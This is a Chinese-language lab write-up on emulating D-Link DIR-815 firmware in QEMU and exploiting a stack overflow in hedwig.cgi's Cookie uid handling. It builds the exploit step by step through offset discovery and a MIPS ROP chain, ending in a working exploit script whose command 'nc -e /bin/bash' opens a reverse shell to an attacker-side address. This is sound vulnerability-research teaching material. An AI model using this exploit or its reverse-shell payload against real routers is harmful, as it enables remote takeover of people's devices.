0x00 前言
=======

固件下载地址：[ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815\_FIRMWARE\_1.01.ZIP](url)

漏洞描述：

DIR-815 cgibi中hedwig\_cgi函数中处理HTTP 头中 Cookie 字段中 uid 的值时存在栈溢出漏洞

本文对于IOT固件模拟进行了详细的操作指导，包括我在实验过程中遇到的一些苦难和解决方式，另外主要对于mips架构下栈溢出漏洞的利用姿势、rop链的构造、跨架构下动态调试方式等进行了详细的解释和操作指导。

0x01 binwalk解包
==============

直接binwalk解包会发现出现错误，rootfs下为空，而且squash文件不能解包。安装sasquatch之后就可以结局这个问题。

![image-20220819114413824.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-1215cbea71b7dbabb45a3f57ed387a51cc67f34b.png)  
binwalk解包如下：

![image-20220819114845936.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-6260e1a815c498889d2e232b6c2e08f1783cbd5d.png)

0x02 系统级固件模拟
============

系统级固件仿真
-------

尝试进行固件模拟，分为用户模拟和系统模拟，但是在用户仿真情况下，不能正常执行shellcode相关功能，因此还是利用系统仿真。

```js
sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian\_squeeze\_mipsel\_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap -nographic
```

遇到一点问题：

![image-20220819152243817.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-d40bd395935ccd43c40b6aa106a9a74afe0b7f37.png)

解决方式：

![image-20220819151732496.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-52bc8d592e0cf535844c0a446ffc826481030648.png)

使用qemu-system-mipsel从系统角度进行模拟，就需要一个mips架构的内核镜像和文件系统。可以在如下网站下载：

[Index of /~aurel32/qemu](https://people.debian.org/~aurel32/qemu/)

因为是小端，这里直接选择mipsel，然后下载其中两个文件：

![image-20220819155440569.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-c360dc475b363e445b91f3116200b0e41b3870e8.png)

下载对应的文件之后成功起来,这是一个与固件对应的虚拟环境，小端的mips系统，其内核镜像和文件系统都是mips架构的虚拟linux系统，我先将其搭建运行环境，然后上传固件binwalk出来的文件系统，根据所需要运行的服务，去选择程序、动态链接库、配置文件构造等等去启动一个服务进行测试。

![image-20220819163052196.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-af3f2f0fe28a421c003b6967760e56d1ebe11bda.png)

网络配置
----

在主机中进行网络配置，可以写在一个sh文件中自动执行：

```js
sudo sysctl -w net.ipv4.ip\_forward=1  
sudo iptables -F  
sudo iptables -X  
sudo iptables -t nat -F  
sudo iptables -t nat -X  
sudo iptables -t mangle -F  
sudo iptables -t mangle -X  
sudo iptables -P INPUT ACCEPT  
sudo iptables -P FORWARD ACCEPT  
sudo iptables -P OUTPUT ACCEPT  
sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE  
sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT  
sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT  
sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0
```

在虚拟机中进行网络配置，下面的eth1可能需要修改为eth0：

```js

ifconfig eth0 192.168.100.2 netmask 255.255.255.0  
route add default gw 192.168.100.254
```

配置完成的效果;

![image-20220819165718016.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-688b8b478a5f6be089cb501a4a52d5d2d1d72301.png)

虚拟机与主机之间可以相互ping通：

![image-20220819165844750.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-efe20ea243a5ae7012e378e73d8213d1b0bb0b2a.png)

为了方便调试，关闭地址随机化：

`echo 0 > /proc/sys/kernel/randomize\_va\_space`

配置并启动服务
-------

上传路由器文件系统：

`scp -r squashfs-root/ root@192.168.100.2:~/`

![image-20220819170222981.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-e8f3525ec3885fa521c0b6e34f3cb1757fb4e23f.png)

系统仿真时，需要模拟启动hedwig.cgi相关服务，模拟其相关服务时需要配置好conf文件：（放在squash根目录下）

```js
Umask 026  
PIDFile /var/run/httpd.pid  
LogGMT On  #开启log  
ErrorLog /log #log文件  
Tuning  
{  
    NumConnections 15  
    BufSize 12288  
    InputBufSize 4096  
    ScriptBufSize 4096  
    NumHeaders 100  
    Timeout 60  
    ScriptTimeout 60  
}  
Control  
{  
    Types  
    {  
        text/html    { html htm }  
        text/xml    { xml }  
        text/plain    { txt }  
        image/gif    { gif }  
        image/jpeg    { jpg }  
        text/css    { css }  
        application/octet-stream { \* }  
    }  
    Specials  
    {  
        Dump        { /dump }  
        CGI            { cgi }  
        Imagemap    { map }  
        Redirect    { url }  
    }  
    External  
    {  
        /usr/sbin/phpcgi { php }  
    }  
}  
Server  
{  
    ServerName "Linux, HTTP/1.1, "  
    ServerId "1234"  
    Family inet  
    Interface eth0         #网卡  
    Address 192.168.100.2  #qemu的ip地址  
    Port "4321"            #对应web访问端口  
    Virtual  
    {  
        AnyHost  
        Control  
        {  
            Alias /  
            Location /htdocs/web  
            IndexNames { index.php }  
            External  
            {  
                /usr/sbin/phpcgi { router\_info.xml }  
                /usr/sbin/phpcgi { post\_login.xml }  
            }  
        }  
        Control  
        {  
            Alias /HNAP1  
            Location /htdocs/HNAP1  
            External  
            {  
                /usr/sbin/hnap { hnap }  
            }  
            IndexNames { index.hnap }  
        }  
    }  
}

```

文件系统的位置:

![image-20220819171731244.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-93bc215fd45792ad690009d79bc3d0fa32bf6789.png)

然后利用如下脚本在qemu中启动httpd服务：（在根目录下运行）

```js
#!/bin/bash  
cp conf /  
cp sbin/httpd /  
cp -rf htdocs/ /  
rm /etc/services  
cp -rf etc/ /  
cp lib/ld-uClibc-0.9.30.1.so  /lib/  
cp lib/libcrypt-0.9.30.1.so  /lib/  
cp lib/libc.so.0  /lib/  
cp lib/libgcc\_s.so.1  /lib/  
cp lib/ld-uClibc.so.0  /lib/  
cp lib/libcrypt.so.0  /lib/  
cp lib/libgcc\_s.so  /lib/  
cp lib/libuClibc-0.9.30.1.so  /lib/  
cd /  
ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi  
ln -s /htdocs/cgibin /usr/sbin/phpcgi  
ln -s  /htdocs/cgibin /usr/sbin/hnap  
./httpd -f conf
```

然后访问hedwigh.cgi，会出现如下的界面。

![image-20220819172441738.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-5028554c6732a3c0c00af17b34feb6d86be72e10.png)

运行hedwig.cgi，出现没有request问题

![image-20220819173037362.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-2394b5038676676ffddd558642c5322b3da44fa4.png)

这是因为没有配置REQUEST\_METHOD等方法，这里通过环境变量进行设置：

```js
export CONTENT\_LENGTH="100"  
export CONTENT\_TYPE="application/x-www-form-urlencoded"  
export REQUEST\_METHOD="POST"  
export REQUEST\_URI="/hedwig.cgi"  
export HTTP\_COOKIE="uid=1234"
```

再次运行错误解决：

![image-20220819173200745.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-e573ef61d1a7efa49169b478b2ff4eef6fe0e6c0.png)

0x03 漏洞静态分析：
============

官方漏洞报告中所说的hedwig.cgi文件，其路径为/htdocs/web/hedwig.cgi，通过ls -l命令看一下，发现其链接到cgibin文件中，首先静态分析漏洞点，漏洞存在于cgibin文件的hedwigci\_main函数中。

![image-20220825090443736.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-bf6fdae0a1af46b7af594f96e50ca7a66469cd5e.png)

静态分析cgibin文件，这里由于低版本的ida对于mips架构程序的逆向分析情况不是很好，所以为了更好的逆向，这里最好下载一个Ghidra。先进入main函数中，主函数主要执行了一个框架的功能，根据\_s参数的不同，通过对比调用不同的函数。

![image-20220825091023034.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-fc2735da7f9afe47c9838448281932d9145280e2.png)

进入逐个分析后在hedwigci\_main中发现了端倪，进如hedwigci\_main函数，其中\_\_s1获取了Request Method，后面进行了限制只能是通过post的方式请求，

![image-20220825091816766.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-b58a2f397bbf43e6f7e93f4653e0634aaffa18cf.png)

接着，会走到cgibin\_parse\_request函数，这个函数的功能就是分析请求数据包，对CONTENT\_TYPE、CONTENT\_Length、URL等信息进行解析分析。简单看了一下不存在漏洞点。

然后程序会执行到如下的代码处，也就是溢出漏洞所在的地方，sess\_get\_uid函数传入参数为iVar5（地址），然后在sess\_get\_uid函数中一定会将uid内容传入iVar5中，然后通过sobj\_get\_string函数将iVar5验证之后给函数sprintf，如果我们可以通过sess\_get\_uid函数精致iVar5参数的值，那么就会造成栈溢出漏洞。

![image-20220825092933107.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-4f46289bd82d0339850fe04025592dddfe2e697b.png)

sess\_get\_uid内参数命名为param\_1，根据其伪代码中param\_1的赋值去溯源观察能否控制其赋值。

![image-20220825100337628.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-cc4534780af31a83c404a25141c4cdf5a4163674.png)

先整体分析其代码，首先是获取HTTP\_COOKIE的值，简单验证取到了之后进入一个循环，这里逆向分析的不是很明确，这个循环是通过一个flag标志变量uVar6和LAB跳转实现的。

![image-20220825104513991.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-4321cc220c5ea0c231f1b46fb627a56a35b6d145.png)

最初定义uVar6为0，会进入如下的代码部分执行，

![image-20220825104610893.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-667c7322e26b5927723d077e9909f6ab3d22bfd5.png)

然后跳转到00407db0的地方，这里判断cookie当下的字符是否为0x3b（；），如果是，则定义uVar6为零，表示cookie处理结束。然后判断是否到0x3d（=），uVar6定义为1，表示进入循环逐个读取，并也就是将=前的部分逐个添加到iVar1。

![image-20220825105305787.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-4d5ec9de4769845f84f1c5c4f402ba9324dc02f7.png)

逐个循环直到判断到当前字符为=时，将uVar6定义为2，然后执行到下面部分将uVar6定义为3，并会跳到407e24的地方执行，会跳过=这个字符执行40728，然后因为uVar6 == 3，所以还是会执行到下图代码中，将=前面的内容和DAT\_0041a5d8('uid')进行对比，如果通过验证之后执行到00407e40。

![image-20220825105618658.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-ebdcf1f1f4f60cf21cd81a0d357966e2eec06cca.png)

然后逐个执行00470e40和00407e48两段代码获取uid=后面的内容，然后赋值param\_1。

![image-20220825110621697.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-bab91c53815df7b67d3acd35945909e917534835.png)

通过上述的分析，sess\_get\_uid函数就是http请求中cookie字段中uid=后的值进行了提取，然后通过sobj\_get\_string进行简单检测之后给sprintf，由于cookie字段可控，所以可以构造payload造成缓冲区溢出。

![image-20220825092933107.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-15daebaf1d866559d1f2abf015735a87f0506c29.png)

sobj\_get\_string函数只要保证uid后的内容不空可以被上述过程解析出来，并且其0x14位不为0即可。

![image-20220825111217893.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-9c2aadea28cd325f33d80f1644555111a257642d.png)

0x04 动态调试
=========

查看其安全防护情况，开启了nx保护，主要的应用思路为利用上述所讲的栈溢出漏洞，通过构造rop链构造相应参数并且执行system命令，以达到攻击效果：

![image-20220822153414713.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-952d235e360744fc200d827ff229432811fe89fc.png)

配置mips小端架构下的动态调试环境，（提示这里的GDBserver和GDB需要交叉编译得到，怎么交叉编译以及具体怎么配置调试环境看我另一篇文章），主机中的DGB也需要进行交叉编译，得到mipsel-linux-gdb（也在另一篇文章中提及），然后运行可执行程序。或者不交叉编译，而是安装gdb-multiarch跨架构执行，推荐用这种方法，因为方便使用pwndbg插件。gdb-multiarch安装指导链接：<https://www.cnblogs.com/LY613313/p/16180128.html>。以下的动态调试中两种方法我都尝试了一下。

确定偏移
----

PWNtools—cyclic计算偏移量（gdb+gdb-multiarch+pwndbg+gdbserver）

首先生成一个2000长度的乱序字符串，复制下来之后粘贴到如下的调试脚本中，XXXXXXXXXXXXXXXXX的位置就是cyclic2000生成的乱序字符串。

`pwndbg> cyclic 2000`

```js
#!/bin/bash  
export CONTENT\_TYPE="application/x-www-form-urlencoded"  
export HTTP\_COOKIE=$(python -c "print 'uid=' + 'XXXXXXXXXXXXXXXXXXXX'")  
#export HTTP\_COOKIE="uid=\`cat context\`"  
export CONTENT\_LENGTH=$(echo -n "$HTTP\_COOKIE" | wc -c)  
export REQUEST\_METHOD="POST"  
export REQUEST\_URI="/hedwig.cgi"  
echo "uid=4321"|./gdbserver.mipsle 192.168.100.254:8888 /htdocs/web/hedwig.cgi  
#echo "uid=4321"|/htdocs/web/hedwig.cgi

```

不下断点，gdb调试运行后报错：Invalid address 0x646b6161

![image-20220826170416031.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-f984c285f2d192baa34ac4397173bc0d39faa41d.png)

然后利用cyclic工具，输入cyclic -l + Invalid address，可以获得一个溢出的偏移，但是这个偏移可能不是很准确，所以还需要再次的验证。

![image-20220826170609715.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-8a8d85ee4fd3d90deacf938afbe711620c25919f.png)

接下来就是动态调试验证偏移是否为1009，利用gdbserver调试，脚本如下（这里是用的mipsel-linux-gdb+gdbserver）：

```js
#!/bin/bash  
export CONTENT\_TYPE="application/x-www-form-urlencoded"  
export HTTP\_COOKIE=$(python -c "print 'uid=' + 'A'\*1009 + 'BBBB'")  
#export HTTP\_COOKIE="uid=\`cat context\`"  
export CONTENT\_LENGTH=$(echo -n "$HTTP\_COOKIE" | wc -c)  
export REQUEST\_METHOD="POST"  
export REQUEST\_URI="/hedwig.cgi"  
echo "uid=4321"|./gdbserver.mipsle 192.168.100.254:8888 /htdocs/web/hedwig.cgi  
#echo "uid=4321"|/htdocs/web/hedwig.cgi
```

由于虚拟机的结构为mips架构，则需要通过交叉编译的方式进行gdbserver的交叉编译，然后传入虚拟机中执行，然后在ubuntu主机中进行远程的GDB连接。

![image-20220826104950537.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-bbfeb3824625bda34ae303d79c8ecfc2d92ebf26.png)

这里下两个断点，一个根据存在漏洞的函数名称下断点，一个下在这个函数的末尾。

![image-20220826151738224.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-db26ca5983c67e3b796b8897bdc32bf9c1b8ca32.png)

然后断在函数末尾时会报错，说没有调到0x42424242的位置，所以说0x42424242（BBBB）已经替换了返回位置，验证了偏移为1009。

![image-20220826162438325.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-e077418eaf42965f11e4097655d9cda57d79578b.png)

构造rop链
------

核心目的就是劫持返回地址，执行system( )函数。为了避免cache incoherency机制，我们利用system函数来构造ROP链进行shell的反弹，而不直接布置shellcode。首先要确定可以调用system函数的libc，利用vmmap查看各区段：

![image-20220826171541542.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-24484e168f3d753868f21d76d94798c5496dde51.png)

有/lib/libc.so.0，查看libc.so.0链接的libc文件,

`ls -l libc.so.0`

```js
lrwxrwxrwx 1 test test 21 Aug 18 20:47 libc.so.0 -> libuClibc-0.9.30.1.so
```

接下来重点分析：

根据ida搜索libuClibc-0.9.30.1.so中的system函数可以得到system的地址为0x00053200，然后通过pwndbg的codebase工具可以得到程序运行的基地址0x77f34000，由于已经关闭了地址随机化，所以该地址可以在调试中多次使用。

![image-20220829113144837.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-cbe823a428c042533773372adf67b50017109693.png)

因为需要构造类似system(cmd)的执行，由于基地址为0x77f34000，system地址为0x00053200，两者相加会出现00造成截断，为了利用可以先将system-1，避免截断的问题，然后通过找gadgets中类似addiu $s0,1命令将system地址恢复。利用mipsrop.find(“addiu $s0,1”)找到gadgets1：0x158c8。

![image-20220830163038253.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-243e75cb20c5c3385c06e599bee0e553f5fa1484.png)

根据上述代码会将system的地址加1，然后跳转到$s5所在的地址，需要将system-1的地址给$s0，然后garget2的地址赋值给$s5。

其中所有给s0-s7寄存器的赋值是通过栈溢出时payload的布局利用如下代码实现的（hedwigci\_main函数返回前的一段指令）：

![image-20220830163714244.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-503ba074733750a4ce5f331cd7191980ab5cc990.png)

那么需要找到给system传参数以及跳转执行的gadgets，利用mipsrop.stackfinder可以找到0x159cc所在的指令gadgets2，这部分指令可以实现将栈上的cmd命令所在的地址赋给$s5,然后jalr跳转到$s0所在的地址执行，由于mips的流水线并行执行会同时会执行jalr下一句move $a0,$s5，$a0为函数调用的参数寄存器，这就在跳转的同时并行完成的给system传参的工作，对这一部分存疑的可以看一下参考链接中关于mips流水线的文章。

![image-20220830153703446.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-6dca4b0811bd75f75e8d984182b6fdddc7bffdbb.png)

通过下图调试，可以知道上面的addiu $s5,$sp,0x170+var\_160中传给$s5的位置是在栈返回地址上面0x10个字节处。所以在payload中在覆盖完返回地址之后需要隔0x10个字节再去放置cmd命令。

![image-20220830112615276.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-edc855994de749e08c2d559b1b607e61c32620f9.png)

根据偏移为1009，最终可以得到exp如下：

```js
\*#!/usr/bin/python2\*  
from pwn import \*  
context.endian = "little"  
context.arch = "mips"  
base\_addr = 0x77f34000  
system\_addr\_1 = 0x53200-1  
gadget1 = 0x158c8  
gadget2 = 0x159cc  
cmd = 'nc -e /bin/bash 192.168.100.254 9999'  
padding = 'A' \* 973  
padding += p32(base\_addr + system\_addr\_1) \*# s0\*  
padding += 'A' \* 4            \*# s1\*  
padding += 'A' \* 4            \*# s2\*  
padding += 'A' \* 4            \*# s3\*  
padding += 'A' \* 4            \*# s4\*  
padding += p32(base\_addr+gadget2)     \*# s5\*  
padding += 'A' \* 4            \*# s6\*  
padding += 'A' \* 4            \*# s7\*  
padding += 'A' \* 4            \*# fp\*  
padding += p32(base\_addr + gadget1)    \*# ra\*  
padding += 'B' \* 0x10  
padding += cmd  
f = open("context",'wb')  
f.write(padding)  
f.close()
```

将上述exp运行后得到context，上传之后防止squash-root主目录，运行exp.sh脚本运行，启动hedwig.cgi服务，脚本如下：

```js
!/bin/bash
export CONTENT_TYPE="application/x-www-form-urlencoded"
#export HTTP_COOKIE=$(python -c "print 'uid=' + 'A'*1009 + 'BBBB'")
export HTTP_COOKIE="uid=`cat context`"
export CONTENT_LENGTH=$(echo -n "$HTTP_COOKIE" | wc -c)
export REQUEST_METHOD="POST"
export REQUEST_URI="/hedwig.cgi"
#echo "uid=4321"|./gdbserver.mipsle 192.168.100.254:8888 /htdocs/web/hedwig.cgi
echo "uid=4321"|/htdocs/web/hedwig.cgi
```

攻击端监听，得到如下结果：

![image-20220830155649043.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-d10d961e1d86056726423e9ea874397734f3a1cb.png)

EXP运行时动态调试栈空间：

![image-20220830164254983.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-0fd9e07995abbed26a9353ada16566fee9b7da39.png)

0x05 参考连接
=========

几种固件仿真方式：<https://cloud.tencent.com/developer/article/1883281>

Ghidra下载安装以及快捷键使用：<https://www.cnblogs.com/iBinary/p/13852204.html>

mips下栈溢出相关知识点：<https://xz.aliyun.com/t/6808>

固件模拟与复现：<http://www.ctfiot.com/20823.html>、<http://www.ctfiot.com/41773.html>

mips架构汇编指令学习：<https://blog.csdn.net/peachhhh/article/details/114376694>

gdb-multiarch安装指导链接：<https://www.cnblogs.com/LY613313/p/16180128.html>

mips流水线与指令集并行处理：<https://www.bilibili.com/read/cv14585357>、<https://www.bilibili.com/read/cv14595039/>